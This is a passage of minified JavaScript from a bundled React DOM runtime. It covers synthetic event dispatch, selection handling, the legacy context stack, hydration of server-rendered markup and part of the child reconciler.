    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t === "input" ? !!ep[e.type] : t === "textarea"
}
function Fu(e, t, n, r) {
    vu(r),
    t = $r(t, "onChange"),
    0 < t.length && (n = new po("onChange","change",null,n,r),
    e.push({
        event: n,
        listeners: t
    }))
}
var ua = null
  , ka = null;
function tp(e) {
    Xu(e, 0)
}
function ts(e) {
    var t = Sn(e);
    if (mu(t))
        return e
}
function np(e, t) {
    if (e === "change")
        return t
}
var Ku = !1;
if (yt) {
    var Ps;
    if (yt) {
        var $s = "oninput"in document;
        if (!$s) {
            var Cl = document.createElement("div");
            Cl.setAttribute("oninput", "return;"),
            $s = typeof Cl.oninput == "function"
        }
        Ps = $s
    } else
        Ps = !1;
    Ku = Ps && (!document.documentMode || 9 < document.documentMode)
}
function Pl() {
    ua && (ua.detachEvent("onpropertychange", _u),
    ka = ua = null)
}
function _u(e) {
    if (e.propertyName === "value" && ts(ka)) {
        var t = [];
        Fu(t, ka, e, oo(e)),
        Nu(tp, t)
    }
}
function ap(e, t, n) {
    e === "focusin" ? (Pl(),
    ua = t,
    ka = n,
    ua.attachEvent("onpropertychange", _u)) : e === "focusout" && Pl()
}
function rp(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown")
        return ts(ka)
}
function sp(e, t) {
    if (e === "click")
        return ts(t)
}
function ip(e, t) {
    if (e === "input" || e === "change")
        return ts(t)
}
function op(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var nt = typeof Object.is == "function" ? Object.is : op;
function ja(e, t) {
    if (nt(e, t))
        return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null)
        return !1;
    var n = Object.keys(e)
      , r = Object.keys(t);
    if (n.length !== r.length)
        return !1;
    for (r = 0; r < n.length; r++) {
        var s = n[r];
        if (!Qs.call(t, s) || !nt(e[s], t[s]))
            return !1
    }
    return !0
}
function $l(e) {
    for (; e && e.firstChild; )
        e = e.firstChild;
    return e
}
function El(e, t) {
    var n = $l(e);
    e = 0;
    for (var r; n; ) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length,
            e <= t && r >= t)
                return {
                    node: n,
                    offset: t - e
                };
            e = r
        }
        e: {
            for (; n; ) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = $l(n)
    }
}
function Vu(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? Vu(e, t.parentNode) : "contains"in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}
function Hu() {
    for (var e = window, t = Nr(); t instanceof e.HTMLIFrameElement; ) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n)
            e = t.contentWindow;
        else
            break;
        t = Nr(e.document)
    }
    return t
}
function go(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}
function lp(e) {
    var t = Hu()
      , n = e.focusedElem
      , r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && Vu(n.ownerDocument.documentElement, n)) {
        if (r !== null && go(n)) {
            if (t = r.start,
            e = r.end,
            e === void 0 && (e = t),
            "selectionStart"in n)
                n.selectionStart = t,
                n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window,
            e.getSelection) {
                e = e.getSelection();
                var s = n.textContent.length
                  , i = Math.min(r.start, s);
                r = r.end === void 0 ? i : Math.min(r.end, s),
                !e.extend && i > r && (s = r,
                r = i,
                i = s),
                s = El(n, i);
                var o = El(n, r);
                s && o && (e.rangeCount !== 1 || e.anchorNode !== s.node || e.anchorOffset !== s.offset || e.focusNode !== o.node || e.focusOffset !== o.offset) && (t = t.createRange(),
                t.setStart(s.node, s.offset),
                e.removeAllRanges(),
                i > r ? (e.addRange(t),
                e.extend(o.node, o.offset)) : (t.setEnd(o.node, o.offset),
                e.addRange(t)))
            }
        }
        for (t = [],
        e = n; e = e.parentNode; )
            e.nodeType === 1 && t.push({
                element: e,
                left: e.scrollLeft,
                top: e.scrollTop
            });
        for (typeof n.focus == "function" && n.focus(),
        n = 0; n < t.length; n++)
            e = t[n],
            e.element.scrollLeft = e.left,
            e.element.scrollTop = e.top
    }
}
var cp = yt && "documentMode"in document && 11 >= document.documentMode
  , yn = null
  , xi = null
  , da = null
  , gi = !1;
function Al(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    gi || yn == null || yn !== Nr(r) || (r = yn,
    "selectionStart"in r && go(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(),
    r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }),
    da && ja(da, r) || (da = r,
    r = $r(xi, "onSelect"),
    0 < r.length && (t = new po("onSelect","select",null,t,n),
    e.push({
        event: t,
        listeners: r
    }),
    t.target = yn)))
}
function Qa(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(),
    n["Webkit" + e] = "webkit" + t,
    n["Moz" + e] = "moz" + t,
    n
}
var vn = {
    animationend: Qa("Animation", "AnimationEnd"),
    animationiteration: Qa("Animation", "AnimationIteration"),
    animationstart: Qa("Animation", "AnimationStart"),
    transitionend: Qa("Transition", "TransitionEnd")
}
  , Es = {}
  , Gu = {};
yt && (Gu = document.createElement("div").style,
"AnimationEvent"in window || (delete vn.animationend.animation,
delete vn.animationiteration.animation,
delete vn.animationstart.animation),
"TransitionEvent"in window || delete vn.transitionend.transition);
function ns(e) {
    if (Es[e])
        return Es[e];
    if (!vn[e])
        return e;
    var t = vn[e], n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in Gu)
            return Es[e] = t[n];
    return e
}
var qu = ns("animationend")
  , Yu = ns("animationiteration")
  , Ju = ns("animationstart")
  , Qu = ns("transitionend")
  , Zu = new Map
  , Il = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
function Ft(e, t) {
    Zu.set(e, t),
    on(t, [e])
}
for (var As = 0; As < Il.length; As++) {
    var Is = Il[As]
      , up = Is.toLowerCase()
      , dp = Is[0].toUpperCase() + Is.slice(1);
    Ft(up, "on" + dp)
}
Ft(qu, "onAnimationEnd");
Ft(Yu, "onAnimationIteration");
Ft(Ju, "onAnimationStart");
Ft("dblclick", "onDoubleClick");
Ft("focusin", "onFocus");
Ft("focusout", "onBlur");
Ft(Qu, "onTransitionEnd");
Rn("onMouseEnter", ["mouseout", "mouseover"]);
Rn("onMouseLeave", ["mouseout", "mouseover"]);
Rn("onPointerEnter", ["pointerout", "pointerover"]);
Rn("onPointerLeave", ["pointerout", "pointerover"]);
on("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
on("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
on("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
on("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
on("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
on("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var ia = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
  , mp = new Set("cancel close invalid load scroll toggle".split(" ").concat(ia));
function Dl(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n,
    uh(r, t, void 0, e),
    e.currentTarget = null
}
function Xu(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n]
          , s = r.event;
        r = r.listeners;
        e: {
            var i = void 0;
            if (t)
                for (var o = r.length - 1; 0 <= o; o--) {
                    var l = r[o]
                      , u = l.instance
                      , c = l.currentTarget;
                    if (l = l.listener,
                    u !== i && s.isPropagationStopped())
                        break e;
                    Dl(s, l, c),
                    i = u
                }
            else
                for (o = 0; o < r.length; o++) {
                    if (l = r[o],
                    u = l.instance,
                    c = l.currentTarget,
                    l = l.listener,
                    u !== i && s.isPropagationStopped())
                        break e;
                    Dl(s, l, c),
                    i = u
                }
        }
    }
    if (jr)
        throw e = mi,
        jr = !1,
        mi = null,
        e
}
function X(e, t) {
    var n = t[bi];
    n === void 0 && (n = t[bi] = new Set);
    var r = e + "__bubble";
    n.has(r) || (ed(t, e, 2, !1),
    n.add(r))
}
function Ds(e, t, n) {
    var r = 0;
    t && (r |= 4),
    ed(n, e, r, t)
}
var Za = "_reactListening" + Math.random().toString(36).slice(2);
function Ba(e) {
    if (!e[Za]) {
        e[Za] = !0,
        ou.forEach(function(n) {
            n !== "selectionchange" && (mp.has(n) || Ds(n, !1, e),
            Ds(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[Za] || (t[Za] = !0,
        Ds("selectionchange", !1, t))
    }
}
function ed(e, t, n, r) {
    switch (Uu(t)) {
    case 1:
        var s = Bh;
        break;
    case 4:
        s = Th;
        break;
    default:
        s = mo
    }
    n = s.bind(null, t, n, e),
    s = void 0,
    !di || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (s = !0),
    r ? s !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: s
    }) : e.addEventListener(t, n, !0) : s !== void 0 ? e.addEventListener(t, n, {
        passive: s
    }) : e.addEventListener(t, n, !1)
}
function Rs(e, t, n, r, s) {
    var i = r;
    if (!(t & 1) && !(t & 2) && r !== null)
        e: for (; ; ) {
            if (r === null)
                return;
            var o = r.tag;
            if (o === 3 || o === 4) {
                var l = r.stateNode.containerInfo;
                if (l === s || l.nodeType === 8 && l.parentNode === s)
                    break;
                if (o === 4)
                    for (o = r.return; o !== null; ) {
                        var u = o.tag;
                        if ((u === 3 || u === 4) && (u = o.stateNode.containerInfo,
                        u === s || u.nodeType === 8 && u.parentNode === s))
                            return;
                        o = o.return
                    }
                for (; l !== null; ) {
                    if (o = qt(l),
                    o === null)
                        return;
                    if (u = o.tag,
                    u === 5 || u === 6) {
                        r = i = o;
                        continue e
                    }
                    l = l.parentNode
                }
            }
            r = r.return
        }
    Nu(function() {
        var c = i
          , m = oo(n)
          , h = [];
        e: {
            var x = Zu.get(e);
            if (x !== void 0) {
                var y = po
                  , v = e;
                switch (e) {
                case "keypress":
                    if (hr(n) === 0)
                        break e;
                case "keydown":
                case "keyup":
                    y = Fh;
                    break;
                case "focusin":
                    v = "focus",
                    y = Cs;
                    break;
                case "focusout":
                    v = "blur",
                    y = Cs;
                    break;
                case "beforeblur":
                case "afterblur":
                    y = Cs;
                    break;
                case "click":
                    if (n.button === 2)
                        break e;
                case "auxclick":
                case "dblclick":
                case "mousedown":
                case "mousemove":
                case "mouseup":
                case "mouseout":
                case "mouseover":
                case "contextmenu":
                    y = bl;
                    break;
                case "drag":
                case "dragend":
                case "dragenter":
                case "dragexit":
                case "dragleave":
                case "dragover":
                case "dragstart":
                case "drop":
                    y = $h;
                    break;
                case "touchcancel":
                case "touchend":
                case "touchmove":
                case "touchstart":
                    y = Vh;
                    break;
                case qu:
                case Yu:
                case Ju:
                    y = Ih;
                    break;
                case Qu:
                    y = Gh;
                    break;
                case "scroll":
                    y = Ch;
                    break;
                case "wheel":
                    y = Yh;
                    break;
                case "copy":
                case "cut":
                case "paste":
                    y = Rh;
                    break;
                case "gotpointercapture":
                case "lostpointercapture":
                case "pointercancel":
                case "pointerdown":
                case "pointermove":
                case "pointerout":
                case "pointerover":
                case "pointerup":
                    y = kl
                }
                var k = (t & 4) !== 0
                  , p = !k && e === "scroll"
                  , f = k ? x !== null ? x + "Capture" : null : x;
                k = [];
                for (var d = c, g; d !== null; ) {
                    g = d;
                    var S = g.stateNode;
                    if (g.tag === 5 && S !== null && (g = S,
                    f !== null && (S = Sa(d, f),
                    S != null && k.push(Ta(d, S, g)))),
                    p)
                        break;
                    d = d.return
                }
                0 < k.length && (x = new y(x,v,null,n,m),
                h.push({
                    event: x,
                    listeners: k
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (x = e === "mouseover" || e === "pointerover",
                y = e === "mouseout" || e === "pointerout",
                x && n !== ci && (v = n.relatedTarget || n.fromElement) && (qt(v) || v[vt]))
                    break e;
                if ((y || x) && (x = m.window === m ? m : (x = m.ownerDocument) ? x.defaultView || x.parentWindow : window,
                y ? (v = n.relatedTarget || n.toElement,
                y = c,
                v = v ? qt(v) : null,
                v !== null && (p = ln(v),
                v !== p || v.tag !== 5 && v.tag !== 6) && (v = null)) : (y = null,
                v = c),
                y !== v)) {
                    if (k = bl,
                    S = "onMouseLeave",
                    f = "onMouseEnter",
                    d = "mouse",
                    (e === "pointerout" || e === "pointerover") && (k = kl,
                    S = "onPointerLeave",
                    f = "onPointerEnter",
                    d = "pointer"),
                    p = y == null ? x : Sn(y),
                    g = v == null ? x : Sn(v),
                    x = new k(S,d + "leave",y,n,m),
                    x.target = p,
                    x.relatedTarget = g,
                    S = null,
                    qt(m) === c && (k = new k(f,d + "enter",v,n,m),
                    k.target = g,
                    k.relatedTarget = p,
                    S = k),
                    p = S,
                    y && v)
                        t: {
                            for (k = y,
                            f = v,
                            d = 0,
                            g = k; g; g = un(g))
                                d++;
                            for (g = 0,
                            S = f; S; S = un(S))
                                g++;
                            for (; 0 < d - g; )
                                k = un(k),
                                d--;
                            for (; 0 < g - d; )
                                f = un(f),
                                g--;
                            for (; d--; ) {
                                if (k === f || f !== null && k === f.alternate)
                                    break t;
                                k = un(k),
                                f = un(f)
                            }
                            k = null
                        }
                    else
                        k = null;
                    y !== null && Rl(h, x, y, k, !1),
                    v !== null && p !== null && Rl(h, p, v, k, !0)
                }
            }
            e: {
                if (x = c ? Sn(c) : window,
                y = x.nodeName && x.nodeName.toLowerCase(),
                y === "select" || y === "input" && x.type === "file")
                    var w = np;
                else if (Tl(x))
                    if (Ku)
                        w = ip;
                    else {
                        w = rp;
                        var j = ap
                    }
                else
                    (y = x.nodeName) && y.toLowerCase() === "input" && (x.type === "checkbox" || x.type === "radio") && (w = sp);
                if (w && (w = w(e, c))) {
                    Fu(h, w, n, m);
                    break e
                }
                j && j(e, x, c),
                e === "focusout" && (j = x._wrapperState) && j.controlled && x.type === "number" && ri(x, "number", x.value)
            }
            switch (j = c ? Sn(c) : window,
            e) {
            case "focusin":
                (Tl(j) || j.contentEditable === "true") && (yn = j,
                xi = c,
                da = null);
                break;
            case "focusout":
                da = xi = yn = null;
                break;
            case "mousedown":
                gi = !0;
                break;
            case "contextmenu":
            case "mouseup":
            case "dragend":
                gi = !1,
                Al(h, n, m);
                break;
            case "selectionchange":
                if (cp)
                    break;
            case "keydown":
            case "keyup":
                Al(h, n, m)
            }
            var B;
            if (xo)
                e: {
                    switch (e) {
                    case "compositionstart":
                        var b = "onCompositionStart";
                        break e;
                    case "compositionend":
                        b = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        b = "onCompositionUpdate";
                        break e
                    }
                    b = void 0
                }
            else
                gn ? Lu(e, n) && (b = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (b = "onCompositionStart");
            b && (Wu && n.locale !== "ko" && (gn || b !== "onCompositionStart" ? b === "onCompositionEnd" && gn && (B = zu()) : (Pt = m,
            ho = "value"in Pt ? Pt.value : Pt.textContent,
            gn = !0)),
            j = $r(c, b),
            0 < j.length && (b = new Nl(b,e,null,n,m),
            h.push({
                event: b,
                listeners: j
            }),
            B ? b.data = B : (B = Ou(n),
            B !== null && (b.data = B)))),
            (B = Qh ? Zh(e, n) : Xh(e, n)) && (c = $r(c, "onBeforeInput"),
            0 < c.length && (m = new Nl("onBeforeInput","beforeinput",null,n,m),
            h.push({
                event: m,
                listeners: c
            }),
            m.data = B))
        }
        Xu(h, t)
    })
}
function Ta(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}
function $r(e, t) {
    for (var n = t + "Capture", r = []; e !== null; ) {
        var s = e
          , i = s.stateNode;
        s.tag === 5 && i !== null && (s = i,
        i = Sa(e, n),
        i != null && r.unshift(Ta(e, i, s)),
        i = Sa(e, t),
        i != null && r.push(Ta(e, i, s))),
        e = e.return
    }
    return r
}
function un(e) {
    if (e === null)
        return null;
    do
        e = e.return;
    while (e && e.tag !== 5);
    return e || null
}
function Rl(e, t, n, r, s) {
    for (var i = t._reactName, o = []; n !== null && n !== r; ) {
        var l = n
          , u = l.alternate
          , c = l.stateNode;
        if (u !== null && u === r)
            break;
        l.tag === 5 && c !== null && (l = c,
        s ? (u = Sa(n, i),
        u != null && o.unshift(Ta(n, u, l))) : s || (u = Sa(n, i),
        u != null && o.push(Ta(n, u, l)))),
        n = n.return
    }
    o.length !== 0 && e.push({
        event: t,
        listeners: o
    })
}
var hp = /\r\n?/g
  , pp = /\u0000|\uFFFD/g;
function Ml(e) {
    return (typeof e == "string" ? e : "" + e).replace(hp, `
`).replace(pp, "")
}
function Xa(e, t, n) {
    if (t = Ml(t),
    Ml(e) !== t && n)
        throw Error(C(425))
}
function Er() {}
var yi = null
  , vi = null;
function Si(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var wi = typeof setTimeout == "function" ? setTimeout : void 0
  , fp = typeof clearTimeout == "function" ? clearTimeout : void 0
  , Ul = typeof Promise == "function" ? Promise : void 0
  , xp = typeof queueMicrotask == "function" ? queueMicrotask : typeof Ul < "u" ? function(e) {
    return Ul.resolve(null).then(e).catch(gp)
}
: wi;
function gp(e) {
    setTimeout(function() {
        throw e
    })
}
function Ms(e, t) {
    var n = t
      , r = 0;
    do {
        var s = n.nextSibling;
        if (e.removeChild(n),
        s && s.nodeType === 8)
            if (n = s.data,
            n === "/$") {
                if (r === 0) {
                    e.removeChild(s),
                    Na(t);
                    return
                }
                r--
            } else
                n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = s
    } while (n);
    Na(t)
}
function Dt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3)
            break;
        if (t === 8) {
            if (t = e.data,
            t === "$" || t === "$!" || t === "$?")
                break;
            if (t === "/$")
                return null
        }
    }
    return e
}
function zl(e) {
    e = e.previousSibling;
    for (var t = 0; e; ) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0)
                    return e;
                t--
            } else
                n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var Vn = Math.random().toString(36).slice(2)
  , ot = "__reactFiber$" + Vn
  , Ca = "__reactProps$" + Vn
  , vt = "__reactContainer$" + Vn
  , bi = "__reactEvents$" + Vn
  , yp = "__reactListeners$" + Vn
  , vp = "__reactHandles$" + Vn;
function qt(e) {
    var t = e[ot];
    if (t)
        return t;
    for (var n = e.parentNode; n; ) {
        if (t = n[vt] || n[ot]) {
            if (n = t.alternate,
            t.child !== null || n !== null && n.child !== null)
                for (e = zl(e); e !== null; ) {
                    if (n = e[ot])
                        return n;
                    e = zl(e)
                }
            return t
        }
        e = n,
        n = e.parentNode
    }
    return null
}
function Oa(e) {
    return e = e[ot] || e[vt],
    !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}
function Sn(e) {
    if (e.tag === 5 || e.tag === 6)
        return e.stateNode;
    throw Error(C(33))
}
function as(e) {
    return e[Ca] || null
}
var Ni = []
  , wn = -1;
function Kt(e) {
    return {
        current: e
    }
}
function ee(e) {
    0 > wn || (e.current = Ni[wn],
    Ni[wn] = null,
    wn--)
}
function Z(e, t) {
    wn++,
    Ni[wn] = e.current,
    e.current = t
}
var Lt = {}
  , we = Kt(Lt)
  , Pe = Kt(!1)
  , tn = Lt;
function Mn(e, t) {
    var n = e.type.contextTypes;
    if (!n)
        return Lt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t)
        return r.__reactInternalMemoizedMaskedChildContext;
    var s = {}, i;
    for (i in n)
        s[i] = t[i];
    return r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = t,
    e.__reactInternalMemoizedMaskedChildContext = s),
    s
}
function $e(e) {
    return e = e.childContextTypes,
    e != null
}
function Ar() {
    ee(Pe),
    ee(we)
}
function Wl(e, t, n) {
    if (we.current !== Lt)
        throw Error(C(168));
    Z(we, t),
    Z(Pe, n)
}
function td(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes,
    typeof r.getChildContext != "function")
        return n;
    r = r.getChildContext();
    for (var s in r)
        if (!(s in t))
            throw Error(C(108, ah(e) || "Unknown", s));
    return re({}, n, r)
}
function Ir(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Lt,
    tn = we.current,
    Z(we, e),
    Z(Pe, Pe.current),
    !0
}
function Ll(e, t, n) {
    var r = e.stateNode;
    if (!r)
        throw Error(C(169));
    n ? (e = td(e, t, tn),
    r.__reactInternalMemoizedMergedChildContext = e,
    ee(Pe),
    ee(we),
    Z(we, e)) : ee(Pe),
    Z(Pe, n)
}
var ht = null
  , rs = !1
  , Us = !1;
function nd(e) {
    ht === null ? ht = [e] : ht.push(e)
}
function Sp(e) {
    rs = !0,
    nd(e)
}
function _t() {
    if (!Us && ht !== null) {
        Us = !0;
        var e = 0
          , t = Y;
        try {
            var n = ht;
            for (Y = 1; e < n.length; e++) {
                var r = n[e];
                do
                    r = r(!0);
                while (r !== null)
            }
            ht = null,
            rs = !1
        } catch (s) {
            throw ht !== null && (ht = ht.slice(e + 1)),
            Tu(lo, _t),
            s
        } finally {
            Y = t,
            Us = !1
        }
    }
    return null
}
var bn = []
  , Nn = 0
  , Dr = null
  , Rr = 0
  , Ke = []
  , _e = 0
  , nn = null
  , ft = 1
  , xt = "";
function Ht(e, t) {
    bn[Nn++] = Rr,
    bn[Nn++] = Dr,
    Dr = e,
    Rr = t
}
function ad(e, t, n) {
    Ke[_e++] = ft,
    Ke[_e++] = xt,
    Ke[_e++] = nn,
    nn = e;
    var r = ft;
    e = xt;
    var s = 32 - Xe(r) - 1;
    r &= ~(1 << s),
    n += 1;
    var i = 32 - Xe(t) + s;
    if (30 < i) {
        var o = s - s % 5;
        i = (r & (1 << o) - 1).toString(32),
        r >>= o,
        s -= o,
        ft = 1 << 32 - Xe(t) + s | n << s | r,
        xt = i + e
    } else
        ft = 1 << i | n << s | r,
        xt = e
}
function yo(e) {
    e.return !== null && (Ht(e, 1),
    ad(e, 1, 0))
}
function vo(e) {
    for (; e === Dr; )
        Dr = bn[--Nn],
        bn[Nn] = null,
        Rr = bn[--Nn],
        bn[Nn] = null;
    for (; e === nn; )
        nn = Ke[--_e],
        Ke[_e] = null,
        xt = Ke[--_e],
        Ke[_e] = null,
        ft = Ke[--_e],
        Ke[_e] = null
}
var Ue = null
  , Re = null
  , te = !1
  , Ze = null;
function rd(e, t) {
    var n = Ve(5, null, null, 0);
    n.elementType = "DELETED",
    n.stateNode = t,
    n.return = e,
    t = e.deletions,
    t === null ? (e.deletions = [n],
    e.flags |= 16) : t.push(n)
}
function Ol(e, t) {
    switch (e.tag) {
    case 5:
        var n = e.type;
        return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t,
        t !== null ? (e.stateNode = t,
        Ue = e,
        Re = Dt(t.firstChild),
        !0) : !1;
    case 6:
        return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t,
        t !== null ? (e.stateNode = t,
        Ue = e,
        Re = null,
        !0) : !1;
    case 13:
        return t = t.nodeType !== 8 ? null : t,
        t !== null ? (n = nn !== null ? {
            id: ft,
            overflow: xt
        } : null,
        e.memoizedState = {
            dehydrated: t,
            treeContext: n,
            retryLane: 1073741824
        },
        n = Ve(18, null, null, 0),
        n.stateNode = t,
        n.return = e,
        e.child = n,
        Ue = e,
        Re = null,
        !0) : !1;
    default:
        return !1
    }
}
function ki(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}
function ji(e) {
    if (te) {
        var t = Re;
        if (t) {
            var n = t;
            if (!Ol(e, t)) {
                if (ki(e))
                    throw Error(C(418));
                t = Dt(n.nextSibling);
                var r = Ue;
                t && Ol(e, t) ? rd(r, n) : (e.flags = e.flags & -4097 | 2,
                te = !1,
                Ue = e)
            }
        } else {
            if (ki(e))
                throw Error(C(418));
            e.flags = e.flags & -4097 | 2,
            te = !1,
            Ue = e
        }
    }
}
function Fl(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13; )
        e = e.return;
    Ue = e
}
function er(e) {
    if (e !== Ue)
        return !1;
    if (!te)
        return Fl(e),
        te = !0,
        !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type,
    t = t !== "head" && t !== "body" && !Si(e.type, e.memoizedProps)),
    t && (t = Re)) {
        if (ki(e))
            throw sd(),
            Error(C(418));
        for (; t; )
            rd(e, t),
            t = Dt(t.nextSibling)
    }
    if (Fl(e),
    e.tag === 13) {
        if (e = e.memoizedState,
        e = e !== null ? e.dehydrated : null,
        !e)
            throw Error(C(317));
        e: {
            for (e = e.nextSibling,
            t = 0; e; ) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            Re = Dt(e.nextSibling);
                            break e
                        }
                        t--
                    } else
                        n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            Re = null
        }
    } else
        Re = Ue ? Dt(e.stateNode.nextSibling) : null;
    return !0
}
function sd() {
    for (var e = Re; e; )
        e = Dt(e.nextSibling)
}
function Un() {
    Re = Ue = null,
    te = !1
}
function So(e) {
    Ze === null ? Ze = [e] : Ze.push(e)
}
var wp = bt.ReactCurrentBatchConfig;
function Zn(e, t, n) {
    if (e = n.ref,
    e !== null && typeof e != "function" && typeof e != "object") {
        if (n._owner) {
            if (n = n._owner,
            n) {
                if (n.tag !== 1)
                    throw Error(C(309));
                var r = n.stateNode
            }
            if (!r)
                throw Error(C(147, e));
            var s = r
              , i = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === i ? t.ref : (t = function(o) {
                var l = s.refs;
                o === null ? delete l[i] : l[i] = o
            }
            ,
            t._stringRef = i,
            t)
        }
        if (typeof e != "string")
            throw Error(C(284));
        if (!n._owner)
            throw Error(C(290, e))
    }
    return e
}
function tr(e, t) {
    throw e = Object.prototype.toString.call(t),
    Error(C(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}
function Kl(e) {
    var t = e._init;
    return t(e._payload)
}
function id(e) {
    function t(f, d) {
        if (e) {
            var g = f.deletions;
            g === null ? (f.deletions = [d],
            f.flags |= 16) : g.push(d)
        }
    }
    function n(f, d) {
        if (!e)
            return null;
        for (; d !== null; )
            t(f, d),
            d = d.sibling;
        return null
    }
    function r(f, d) {
        for (f = new Map; d !== null; )
            d.key !== null ? f.set(d.key, d) : f.set(d.index, d),
            d = d.sibling;
        return f
    }
    function s(f, d) {
        return f = zt(f, d),
        f.index = 0,
        f.sibling = null,
        f
    }
    function i(f, d, g) {
        return f.index = g,
        e ? (g = f.alternate,
        g !== null ? (g = g.index,
        g < d ? (f.flags |= 2,
        d) : g) : (f.flags |= 2,
        d)) : (f.flags |= 1048576,
        d)
    }
    function o(f) {
        return e && f.alternate === null && (f.flags |= 2),
        f
    }
    function l(f, d, g, S) {
        return d === null || d.tag !== 6 ? (d = _s(g, f.mode, S),
        d.return = f,
        d) : (d = s(d, g),
        d.return = f,
        d)
    }
    function u(f, d, g, S) {
        var w = g.type;
        return w === xn ? m(f, d, g.props.children, S, g.key) : d !== null && (d.elementType === w || typeof w == "object" && w !== null && w.$$typeof === jt && Kl(w) === d.type) ? (S = s(d, g.props),
        S.ref = Zn(f, d, g),
        S.return = f,
        S) : (S = Sr(g.type, g.key, g.props, null, f.mode, S),
        S.ref = Zn(f, d, g),
        S.return = f,
        S)
    }
    function c(f, d, g, S) {
        return d === null || d.tag !== 4 || d.stateNode.containerInfo !== g.containerInfo || d.stateNode.implementation !== g.implementation ? (d = Vs(g, f.mode, S),
        d.return = f,
        d) : (d = s(d, g.children || []),
        d.return = f,
        d)
    }
    function m(f, d, g, S, w) {
        return d === null || d.tag !== 7 ? (d = Xt(g, f.mode, S, w),
        d.return = f,
        d) : (d = s(d, g),
        d.return = f,
        d)
    }
    function h(f, d, g) {
        if (typeof d == "string" && d !== "" || typeof d == "number")
            return d = _s("" + d, f.mode, g),
            d.return = f,
            d;
        if (typeof d == "object" && d !== null) {
            switch (d.$$typeof) {
            case _a:
                return g = Sr(d.type, d.key, d.props, null, f.mode, g),
                g.ref = Zn(f, null, d),
                g.return = f,
                g;
            case fn:
                return d = Vs(d, f.mode, g),
                d.return = f,
                d;
            case jt:
                var S = d._init;
                return h(f, S(d._payload), g)
            }
